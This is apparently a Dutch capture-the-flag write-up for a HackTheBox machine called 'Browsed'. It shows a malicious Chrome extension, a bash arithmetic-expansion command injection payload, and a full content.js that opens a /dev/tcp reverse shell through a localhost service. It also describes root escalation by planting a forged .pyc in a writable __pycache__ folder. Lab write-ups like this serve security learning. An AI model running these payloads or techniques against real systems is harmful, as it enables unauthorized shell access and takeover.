# Browsed

Op deze pagina is een upload mogelijkheid voor chrome plugins. Deze worden
(zoals de website zegt) gedraaid door een admin.

Met het uploaden van een simpele plugin die eigenlijk de cookies/host/etc.
uitleest komen we achter het volgende domein: `browsedinternals.htb`. Hier
draait een gitea omgeving op.

Het lijkt er op dat er een programma kan draaien op poort 5000. Met een hele
hoop pijn en moeite kunnen we via

```js
fetch("localhost:5000", {
  mode: "no-cors",
});
```

achterhalen dat deze applicatie daadwerkelijk draait. Maar data achterhalen is
wat lastig ivm CORS. Maar schijnbaar bestaat er iets dat `Arithmetic expansion`
heet. Hiermee kunnen we wel een command injecteren met wat magie.

# Arithmetic expansion

```sh
if [[ $1 -eq 0 ]]; then
    # ...
fi

if [[ $1 == 0 ]]; then
    # ...
fi
```

Bovenstaande stukje code heeft twee opties, de ene is wel vatbaar en de ander
niet. De vatbare variant is met `-eq`. Wat we hier kunnen doen is een payload
voor `$1` maken die er als volgt uitziet:

```sh
a[$(whoami)]
```

De uitleg:

- `a[]` betekend hier puur dat we array `a` benaderen. Dit kan ook `b[` of iets
  heel anders zijn. Deze array hoeft NIET te bestaan!
- `$(whoami)` dit is een standaard bash shell expansie

Dit werkt alleen bij `-eq` en niet bij de `==` want bash :/

# Revshell

Omdat we nu command injectie hebben kunnen we een revshell maken met de volgende
payload voor de `content.js` van onze chrome plugin.

```js
const IP = "10.10...";

function payloadShell() {
  const revshell = btoa(`/bin/bash -i >& /dev/tcp/${IP}/9001 0>&1`);
  const exploit = `a[$(echo "${revshell}"|base64 -d|bash)]`;
  return encodeURIComponent(exploit);
}

async function exploit() {
  await fetch(`http://127.0.0.1:5000/routines/${payloadShell()}`, {
    method: "GET",
    mode: "no-cors",
  });
}
exploit();
```

# Privesc

Het valt gelijk op dat larry (_de user waarop we een revshell kregen_) een
`sudo` command mag uitvoeren. Kijkend naar het script zie ik eigenlijk niet echt
een command injectie mogelijkheid. Wat wel opvalt is dat de `__pycache__` folder
hier door iedereen aangepast mag worden.

Misschien kunnen we hiermee iets leuks doen. Als ik lokaal een bestand importeer
vanuit de python-repl dan krijg ik eenzelfde `__pycache__`. Benieuwd wat er
gebeurt als ik die upload.

Na wat testen is dit wel iets wat kan, ik moet wel met een hex editor de header
bytes goed zetten (_niet de magische 4 bytes aan het begin_) en als ik het goed
lees is dit de mtime voor het bestand. Maar neem dit met een korrel zout.

Met een docker image met dezelfde python versie een `.pyc` gemaakt waarbij een
`pty.spawn` wordt gedaan. Deze gekopieerd in de `__pycache__` folder en ik heb
een root shell!
